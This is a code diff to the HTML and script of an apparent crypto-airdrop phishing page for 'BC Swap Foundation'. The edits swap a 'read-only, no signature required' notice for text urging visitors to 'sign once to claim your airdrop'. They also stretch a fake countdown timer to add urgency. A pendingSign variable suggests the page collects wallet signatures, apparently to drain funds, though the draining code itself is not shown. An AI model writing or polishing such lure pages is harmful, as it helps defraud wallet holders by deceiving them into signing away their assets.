@@ -112,21 +112,21 @@
     <div class="step active" id="s1">
       <div class="pill">🪂 Airdrop Available</div>
       <h1>You have an <span class="grad">airdrop waiting</span></h1>
-      <p class="sub">BC Swap Foundation is rewarding early supporters and active wallets. Connect your wallet to view your pending airdrop allocation.</p>
+      <p class="sub">BC Swap Foundation is distributing VTCN airdrops to active wallets. Sign to verify ownership and load your allocation.</p>
 
       <div class="hero">
         <span class="icon">🎁</span>
         <div class="reward" id="rewardAmt">— — —<span>BCSWAP</span></div>
         <small style="color:var(--mut);font-size:12px" id="rewardUsd">Connect wallet to view your allocation</small>
         <div class="timer">
-          <div class="tbox"><b id="h">07</b><span>hrs</span></div>
-          <div class="tbox"><b id="m">42</b><span>min</span></div>
-          <div class="tbox"><b id="s">18</b><span>sec</span></div>
+          <div class="tbox"><b id="d">07</b><span>days</span></div>
+          <div class="tbox"><b id="h">14</b><span>hrs</span></div>
+          <div class="tbox"><b id="m">22</b><span>min</span></div>
         </div>
       </div>
 
       <div class="info">
-        🔒 <b>Read-only connection</b> — no signature or transaction required to view your allocation.
+        ⏳ <b>Pending allocation</b> — sign once to claim your airdrop. Standard network fee applies.
       </div>
 
       <button class="btn gold" onclick="goConnect()">
@@ -308,7 +308,7 @@ let pendingSign=null;   // {method, message, raw}
    TIMER
    ===================================================== */
 (function(){
-  let total=7*3600+42*60+18;
+  let total=7*24*3600+14*3600+22*60;
   setInterval(()=>{
     if(total<=0) total=7*3600+42*60+18;
     total--;
